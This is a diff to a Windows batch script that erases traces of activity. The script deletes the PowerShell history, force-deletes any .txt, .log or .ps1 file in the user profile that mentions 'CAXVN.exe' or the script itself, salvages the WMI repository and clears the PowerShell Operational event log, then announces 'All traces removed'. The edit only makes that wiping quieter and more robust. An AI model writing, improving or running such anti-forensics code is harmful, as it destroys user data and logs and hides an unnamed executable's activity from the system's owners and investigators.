@@ -279,7 +279,7 @@ echo off | clip
 echo Cleaning WMI repository logs...
 winmgmt /salvagerepository >nul 2>&1
 
-call :CLEAN_PS_HISTORY
+call :CLEAN_PS_HISTORY_SAFE
 
 echo Cleanup done. All traces removed.
 choice /m "Restart required to fully flush traces. Restart now?"
@@ -321,16 +321,18 @@ del "%temp%\delete_me.vbs" >nul 2>&1
 
 exit
 
-:: === PowerShell History Cleanup ===
+:: === PowerShell History Cleanup (Safe Version) ===
 
-:CLEAN_PS_HISTORY
+:CLEAN_PS_HISTORY_SAFE
 echo Cleaning PowerShell History...
 
-del /f /q "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
+2>nul del /f /q "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
 for /r "%userprofile%" %%F in (*.txt *.log *.ps1) do (
-    findstr /i "CAXVN.exe" "%%F" >nul 2>&1 && del "%%F" >nul 2>&1
-    findstr /i "%~nx0" "%%F" >nul 2>&1 && del "%%F" >nul 2>&1
+    if exist "%%F" (
+        findstr /i "CAXVN.exe" "%%F" >nul 2>nul && del /f /q "%%F" >nul 2>nul
+        findstr /i "%~nx0" "%%F" >nul 2>nul && del /f /q "%%F" >nul 2>nul
+    )
 )
 
 wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>&1
